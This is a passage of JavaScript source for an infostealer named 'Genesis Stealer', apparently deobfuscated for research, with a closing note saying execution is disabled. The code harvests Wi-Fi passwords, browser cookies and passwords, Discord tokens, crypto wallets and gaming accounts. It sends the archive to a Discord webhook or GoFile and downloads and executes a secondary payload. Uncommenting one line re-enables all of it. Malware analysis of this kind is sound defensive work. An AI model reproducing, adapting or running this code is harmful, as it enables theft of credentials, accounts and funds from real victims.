            lunarData.settings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
        }
        copyDirectoryRecursive(lunarPath, path.join(CONFIG.TEMP_DIR, 'lunarclient'));
    } catch (error) {
        console.error('Error extracting LunarClient data:', error.message);
    }
    return lunarData;
}


// ═══════════════════════════════════════════════════════════════════════════
// PART 4: SYSTEM RECONNAISSANCE & DATA FORMATTING
// ═══════════════════════════════════════════════════════════════════════════

function getCPUInfo() {
    const cpus = os.cpus();
    return { model: cpus[0].model, cores: cpus.length, speed: cpus[0].speed };
}

function getRAMInfo() {
    const totalRAM = os.totalmem();
    const freeRAM = os.freemem();
    const usedRAM = totalRAM - freeRAM;
    return { total: (totalRAM / (1024 ** 3)).toFixed(2) + ' GB', free: (freeRAM / (1024 ** 3)).toFixed(2) + ' GB', used: (usedRAM / (1024 ** 3)).toFixed(2) + ' GB', usagePercent: ((usedRAM / totalRAM) * 100).toFixed(2) + '%' };
}

function getGPUInfo() {
    try {
        const output = execSync('powershell "Get-WmiObject Win32_VideoController | Select-Object Name, AdapterRAM | ConvertTo-Json"', { encoding: 'utf8' });
        const gpus = JSON.parse(output);
        if (Array.isArray(gpus)) {
            return gpus.map(gpu => ({ name: gpu.Name, vram: gpu.AdapterRAM ? (gpu.AdapterRAM / (1024 ** 3)).toFixed(2) + ' GB' : 'Unknown' }));
        } else if (gpus) {
            return [{ name: gpus.Name, vram: gpus.AdapterRAM ? (gpus.AdapterRAM / (1024 ** 3)).toFixed(2) + ' GB' : 'Unknown' }];
        }
        return [];
    } catch (error) {
        return [{ name: 'Unknown', vram: 'Unknown' }];
    }
}

function getWindowsVersion() {
    try {
        return execSync('ver', { encoding: 'utf8' }).trim();
    } catch (error) {
        return 'Unknown';
    }
}

function getSystemUptime() {
    const uptime = os.uptime();
    const days = Math.floor(uptime / 86400);
    const hours = Math.floor((uptime % 86400) / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    return `${days}d ${hours}h ${minutes}m`;
}

function getNetworkInfo() {
    const interfaces = os.networkInterfaces();
    const networkInfo = [];
    for (const [name, addresses] of Object.entries(interfaces)) {
        addresses.forEach(addr => {
            if (addr.family === 'IPv4' && !addr.internal) {
                networkInfo.push({ name: name, ip: addr.address, mac: addr.mac });
            }
        });
    }
    return networkInfo;
}

function getSystemInfo() {
    return {
        hostname: os.hostname(),
        username: os.userInfo().username,
        platform: os.platform(),
        arch: os.arch(),
        version: getWindowsVersion(),
        uptime: getSystemUptime(),
        cpu: getCPUInfo(),
        ram: getRAMInfo(),
        gpu: getGPUInfo(),
        network: getNetworkInfo(),
    };
}

function extractWiFiPasswords() {
    const wifiNetworks = [];
    try {
        const profilesOutput = execSync('netsh wlan show profiles', { encoding: 'utf8' });
        const profileRegex = /All User Profile\s+:\s+(.+)/g;
        let match;
        while ((match = profileRegex.exec(profilesOutput)) !== null) {
            const profileName = match[1].trim();
            try {
                const profileOutput = execSync(`netsh wlan show profile name="${profileName}" key=clear`, { encoding: 'utf8' });
                const passwordMatch = /Key Content\s+:\s+(.+)/i.exec(profileOutput);
                if (passwordMatch) {
                    wifiNetworks.push({ ssid: profileName, password: passwordMatch[1].trim() });
                }
            } catch (error) {}
        }
    } catch (error) {
        console.error('Error extracting WiFi passwords:', error.message);
    }
    return wifiNetworks;
}

function getWindowsDefenderStatus() {
    try {
        const output = execSync('powershell "Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, IoavProtectionEnabled | ConvertTo-Json"', { encoding: 'utf8' });
        const status = JSON.parse(output);
        return { antivirusEnabled: status.AntivirusEnabled, realTimeProtection: status.RealTimeProtectionEnabled, behaviorMonitoring: status.IoavProtectionEnabled };
    } catch (error) {
        return { antivirusEnabled: 'Unknown', realTimeProtection: 'Unknown', behaviorMonitoring: 'Unknown' };
    }
}

async function getIPInfo() {
    try {
        const response = await axios.get('http://ip-api.com/json/');
        if (response.status === 200) {
            return { ip: response.data.query, country: response.data.country, region: response.data.regionName, city: response.data.city, zip: response.data.zip, isp: response.data.isp, timezone: response.data.timezone };
        }
        return null;
    } catch (error) {
        console.error('Error getting IP info:', error.message);
        return null;
    }
}

function getInstalledSoftware() {
    const software = [];
    try {
        const output = execSync('powershell "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher | ConvertTo-Json"', { encoding: 'utf8', maxBuffer: 10 * 1024 * 1024 });
        const programs = JSON.parse(output);
        if (Array.isArray(programs)) {
            programs.forEach(program => {
                if (program.DisplayName) {
                    software.push({ name: program.DisplayName, version: program.DisplayVersion || 'Unknown', publisher: program.Publisher || 'Unknown' });
                }
            });
        }
    } catch (error) {
        console.error('Error getting installed software:', error.message);
    }
    return software;
}

function getRunningProcesses() {
    const processes = [];
    try {
        const output = execSync('tasklist /FO CSV /NH', { encoding: 'utf8' });
        const lines = output.split('\n');
        lines.forEach(line => {
            const match = /"([^"]+)","(\d+)","([^"]+)","(\d+)","([^"]+)"/i.exec(line);
            if (match) {
                processes.push({ name: match[1], pid: match[2], memory: match[4] + ' K' });
            }
        });
    } catch (error) {
        console.error('Error getting processes:', error.message);
    }
    return processes;
}

function formatCookiesNetscape(cookies) {
    let output = '# Netscape HTTP Cookie File\n# This is a generated file! Do not edit.\n\n';
    cookies.forEach(cookie => {
        output += `${cookie.domain}\tTRUE\t${cookie.path}\t${cookie.secure ? 'TRUE' : 'FALSE'}\t${cookie.expires}\t${cookie.name}\t${cookie.value}\n`;
    });
    return output;
}

function formatPasswordsText(passwords) {
    let output = '═══════════════════════════════════════════════════════════\nEXTRACTED PASSWORDS\n═══════════════════════════════════════════════════════════\n\n';
    passwords.forEach(pass => {
        output += `URL: ${pass.url}\nUsername: ${pass.username}\nPassword: ${pass.password}\n───────────────────────────────────────────────────────────\n`;
    });
    return output;
}

function formatDiscordTokensText(tokens) {
    let output = '═══════════════════════════════════════════════════════════\nDISCORD TOKENS\n═══════════════════════════════════════════════════════════\n\n';
    tokens.forEach((token, index) => {
        output += `Token ${index + 1}: ${token}\n`;
    });
    return output;
}

function formatSystemInfoText(systemInfo, ipInfo, defenderStatus, wifiNetworks) {
    let output = '═══════════════════════════════════════════════════════════\nSYSTEM INFORMATION\n═══════════════════════════════════════════════════════════\n\n';
    output += '🖥️  COMPUTER INFO\n';
    output += `Hostname: ${systemInfo.hostname}\nUsername: ${systemInfo.username}\nPlatform: ${systemInfo.platform}\nArchitecture: ${systemInfo.arch}\nWindows Version: ${systemInfo.version}\nUptime: ${systemInfo.uptime}\n\n`;
    output += '💻 HARDWARE\n';
    output += `CPU: ${systemInfo.cpu.model} (${systemInfo.cpu.cores} cores @ ${systemInfo.cpu.speed} MHz)\n`;
    output += `RAM: ${systemInfo.ram.total} (${systemInfo.ram.used} used, ${systemInfo.ram.usagePercent})\n`;
    if (systemInfo.gpu && systemInfo.gpu.length > 0) {
        output += 'GPU:\n';
        systemInfo.gpu.forEach(gpu => { output += `  - ${gpu.name} (${gpu.vram})\n`; });
    }
    output += '\n';
    if (ipInfo) {
        output += '🌐 NETWORK & LOCATION\n';
        output += `IP Address: ${ipInfo.ip}\nCountry: ${ipInfo.country}\nRegion: ${ipInfo.region}\nCity: ${ipInfo.city}\nISP: ${ipInfo.isp}\nTimezone: ${ipInfo.timezone}\n\n`;
    }
    output += '🛡️  WINDOWS DEFENDER\n';
    output += `Antivirus Enabled: ${defenderStatus.antivirusEnabled}\nReal-Time Protection: ${defenderStatus.realTimeProtection}\nBehavior Monitoring: ${defenderStatus.behaviorMonitoring}\n\n`;
    if (wifiNetworks && wifiNetworks.length > 0) {
        output += '📶 WIFI NETWORKS\n';
        wifiNetworks.forEach(wifi => {
            output += `SSID: ${wifi.ssid}\nPassword: ${wifi.password}\n───────────────────────────────────────────────────────────\n`;
        });
    }
    return output;
}

function createSystemInfoEmbed(systemInfo, ipInfo) {
    const embed = {
        title: '🖥️ Genesis - System Information',
        color: CONFIG.EMBED_COLOR,
        fields: [],
        footer: { text: `${STRINGS.GENESIS_SOCIETY} | ${STRINGS.GENESIS_KEY}`, icon_url: STRINGS.GENESIS_ICON },
        thumbnail: { url: STRINGS.GENESIS_ICON },
    };
    embed.fields.push({ name: '💻 Computer', value: `**Hostname:** ${systemInfo.hostname}\n**Username:** ${systemInfo.username}\n**OS:** ${systemInfo.version}\n**Uptime:** ${systemInfo.uptime}`, inline: false });
    embed.fields.push({ name: '⚙️ Hardware', value: `**CPU:** ${systemInfo.cpu.model}\n**Cores:** ${systemInfo.cpu.cores}\n**RAM:** ${systemInfo.ram.total} (${systemInfo.ram.usagePercent} used)`, inline: false });
    if (ipInfo) {
        embed.fields.push({ name: '🌐 Location', value: `**IP:** ${ipInfo.ip}\n**Country:** ${ipInfo.country}\n**City:** ${ipInfo.city}\n**ISP:** ${ipInfo.isp}`, inline: false });
    }
    return embed;
}

function createDataSummaryEmbed(stats) {
    const embed = {
        title: '🎯 Genesis - Data Collection Summary',
        color: 0x2ecc71,
        fields: [],
        footer: { text: `${STRINGS.GENESIS_SOCIETY} | ${STRINGS.GENESIS_KEY}`, icon_url: STRINGS.GENESIS_ICON },
        timestamp: new Date().toISOString(),
    };
    embed.fields.push({ name: '🍪 Cookies', value: `${stats.cookies || 0} cookies extracted`, inline: true });
    embed.fields.push({ name: '🔑 Passwords', value: `${stats.passwords || 0} passwords extracted`, inline: true });
    embed.fields.push({ name: '💬 Discord', value: `${stats.tokens || 0} tokens found`, inline: true });
    embed.fields.push({ name: '💰 Wallets', value: `${stats.wallets || 0} wallets detected`, inline: true });
    embed.fields.push({ name: '🎮 Gaming', value: `${stats.minecraft || 0} Minecraft\n${stats.lunar || 0} LunarClient`, inline: true });
    embed.fields.push({ name: '📶 WiFi', value: `${stats.wifi || 0} networks`, inline: true });
    return embed;
}


// ═══════════════════════════════════════════════════════════════════════════
// PART 5: DATA EXFILTRATION & MAIN ORCHESTRATOR
// ═══════════════════════════════════════════════════════════════════════════

async function sendDiscordWebhook(webhookUrl, content = null, embeds = null) {
    try {
        const payload = {};
        if (content) payload.content = content;
        if (embeds) payload.embeds = Array.isArray(embeds) ? embeds : [embeds];
        const response = await axios.post(webhookUrl, payload, { headers: { 'Content-Type': 'application/json' } });
        if (response.status === 204 || response.status === 200) {
            console.log('Discord webhook sent successfully');
            return true;
        }
        return false;
    } catch (error) {
        console.error('Error sending Discord webhook:', error.message);
        return false;
    }
}

async function sendFileToDiscord(webhookUrl, filePath, message = null) {
    try {
        const form = new FormData();
        if (message) form.append('content', message);
        form.append('file', fs.createReadStream(filePath));
        const response = await axios.post(webhookUrl, form, { headers: form.getHeaders() });
        if (response.status === 200) {
            console.log('File sent to Discord successfully');
            return true;
        }
        return false;
    } catch (error) {
        console.error('Error sending file to Discord:', error.message);
        return false;
    }
}

async function uploadToGoFile(filePath) {
    try {
        console.log('Getting GoFile server...');
        const serverResponse = await axios.get(STRINGS.GOFILE_API);
        if (serverResponse.status !== 200 || serverResponse.data.status !== 'ok') {
            console.error('Failed to get GoFile server');
            return null;
        }
        const server = serverResponse.data.data.server;
        console.log(`Using server: ${server}`);
        const form = new FormData();
        form.append('file', fs.createReadStream(filePath));
        const uploadUrl = `https://${server}.gofile.io/uploadFile`;
        console.log('Uploading file to GoFile...');
        const uploadResponse = await axios.post(uploadUrl, form, { headers: form.getHeaders(), maxBodyLength: Infinity, maxContentLength: Infinity });
        if (uploadResponse.status === 200 && uploadResponse.data.status === 'ok') {
            const downloadUrl = uploadResponse.data.data.downloadPage;
            console.log('✅ File uploaded successfully:', downloadUrl);
            return downloadUrl;
        }
        console.error('GoFile upload failed');
        return null;
    } catch (error) {
        console.error('Error uploading to GoFile:', error.message);
        return null;
    }
}

function createDataArchive(tempDir) {
    try {
        const zip = new AdmZip();
        const archivePath = path.join(os.tmpdir(), `genesis_${Date.now()}.zip`);
        console.log('Creating data archive...');
        if (fs.existsSync(tempDir)) {
            zip.addLocalFolder(tempDir);
        }
        zip.writeZip(archivePath);
        console.log('Archive created:', archivePath);
        return archivePath;
    } catch (error) {
        console.error('Error creating archive:', error.message);
        return null;
    }
}

async function downloadAndExecutePayload() {
    try {
        const payloadUrl = STRINGS.GITHUB_PAYLOAD;
        const payloadPath = path.join(os.tmpdir(), STRINGS.PAYLOAD_NAME);
        console.log('Downloading secondary payload...');
        const response = await axios.get(payloadUrl, { responseType: 'arraybuffer' });
        if (response.status === 200) {
            fs.writeFileSync(payloadPath, response.data);
            console.log('Payload downloaded:', payloadPath);
            console.log('Executing payload...');
            exec(`"${payloadPath}"`, (error) => {
                if (error) console.error('Error executing payload:', error.message);
                else console.log('Payload executed successfully');
            });
            return true;
        }
        return false;
    } catch (error) {
        console.error('Error downloading payload:', error.message);
        return false;
    }
}

async function prepareAllData(tempDir) {
    const stats = { cookies: 0, passwords: 0, tokens: 0, wallets: 0, minecraft: 0, lunar: 0, wifi: 0 };
    console.log('Starting data collection...');
    ensureDirectoryExists(tempDir);
    
    console.log('Extracting browser data...');
    const browserData = await extractAllBrowserData();
    if (browserData.cookies.length > 0) {
        writeFileSafe(path.join(tempDir, 'cookies.txt'), formatCookiesNetscape(browserData.cookies));
        stats.cookies = browserData.cookies.length;
    }
    if (browserData.passwords.length > 0) {
        writeFileSafe(path.join(tempDir, 'passwords.txt'), formatPasswordsText(browserData.passwords));
        stats.passwords = browserData.passwords.length;
    }
    
    console.log('Extracting Discord tokens...');
    const tokens = extractDiscordTokens();
    if (tokens.length > 0) {
        writeFileSafe(path.join(tempDir, 'discord_tokens.txt'), formatDiscordTokensText(tokens));
        stats.tokens = tokens.length;
    }
    
    console.log('Extracting cryptocurrency wallets...');
    const browserWallets = extractBrowserWallets();
    const desktopWallets = extractDesktopWallets();
    stats.wallets = browserWallets.length + desktopWallets.length;
    
    console.log('Extracting gaming data...');
    const minecraftData = extractMinecraftData();
    if (minecraftData.profiles) stats.minecraft = 1;
    const lunarData = extractLunarClientData();
    if (lunarData.accounts) stats.lunar = 1;
    
    console.log('Gathering system information...');
    const systemInfo = getSystemInfo();
    const ipInfo = await getIPInfo();
    const defenderStatus = getWindowsDefenderStatus();
    const wifiNetworks = extractWiFiPasswords();
    stats.wifi = wifiNetworks.length;
    writeFileSafe(path.join(tempDir, 'system_info.txt'), formatSystemInfoText(systemInfo, ipInfo, defenderStatus, wifiNetworks));
    
    console.log('Data collection complete!');
    return { stats, systemInfo, ipInfo };
}

async function runStealer() {
    console.log('═══════════════════════════════════════════════════════════');
    console.log('Genesis Stealer - Starting Operation');
    console.log('═══════════════════════════════════════════════════════════');
    
    try {
        console.log('\n[1/7] Terminating browser processes...');
        await killAllBrowsers();
        
        console.log('\n[2/7] Preparing temporary directory...');
        const tempDir = CONFIG.TEMP_DIR;
        ensureDirectoryExists(tempDir);
        
        console.log('\n[3/7] Collecting data...');
        const collectionResult = await prepareAllData(tempDir);
        
        console.log('\n[4/7] Creating archive...');
        const archivePath = createDataArchive(tempDir);
        
        console.log('\n[5/7] Sending system information...');
        const systemInfoEmbed = createSystemInfoEmbed(collectionResult.systemInfo, collectionResult.ipInfo);
        await sendDiscordWebhook(CONFIG.DISCORD_WEBHOOK, null, systemInfoEmbed);
        
        console.log('\n[6/7] Sending data summary...');
        const dataSummaryEmbed = createDataSummaryEmbed(collectionResult.stats);
        await sendDiscordWebhook(CONFIG.DISCORD_WEBHOOK, null, dataSummaryEmbed);
        
        if (archivePath && fs.existsSync(archivePath)) {
            console.log('\n[7/7] Uploading data archive...');
            const fileSize = fs.statSync(archivePath).size;
            if (fileSize < 8 * 1024 * 1024) {
                await sendFileToDiscord(CONFIG.DISCORD_WEBHOOK, archivePath, '🎯 **Genesis - Data Archive**');
            } else {
                const downloadUrl = await uploadToGoFile(archivePath);
                if (downloadUrl) {
                    await sendDiscordWebhook(CONFIG.DISCORD_WEBHOOK, `🎯 **Genesis - Data Archive**\n\n✅ Uploaded to GoFile\n📥 Download: ${downloadUrl}`);
                }
            }
            try { fs.unlinkSync(archivePath); } catch (e) {}
        }
        
        console.log('\n[BONUS] Downloading secondary payload...');
        await downloadAndExecutePayload();
        
        console.log('\nCleaning up...');
        try { fs.rmSync(tempDir, { recursive: true, force: true }); } catch (e) {}
        
        console.log('\n═══════════════════════════════════════════════════════════');
        console.log('Genesis Stealer - Operation Complete');
        console.log('═══════════════════════════════════════════════════════════');
        
    } catch (error) {
        console.error('Error during stealer execution:', error.message);
        try {
            await sendDiscordWebhook(CONFIG.DISCORD_WEBHOOK, `⚠️ **Genesis - Error**\n\`\`\`${error.message}\`\`\``);
        } catch (e) {}
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// EXECUTION ENTRY POINT
// ═══════════════════════════════════════════════════════════════════════════

/**
 * ⚠️  EXECUTION DISABLED FOR SAFETY ⚠️
 *
 * In the original malware, this would be called immediately.
 * For research purposes, execution is commented out.
 * To analyze behavior, call runStealer() manually in a controlled environment.
 */

// To run the script, uncomment the following line:
// runStealer().catch(console.error);

console.log('═══════════════════════════════════════════════════════════');
console.log('⚠️  MALWARE CODE LOADED BUT NOT EXECUTED');
console.log('═══════════════════════════════════════════════════════════');
console.log('This is a deobfuscated malware file for research purposes.');
console.log('Execution has been DISABLED for safety.');
console.log('');
console.log('To analyze behavior in a VM, uncomment the execution line above.');
console.log('═══════════════════════════════════════════════════════════');
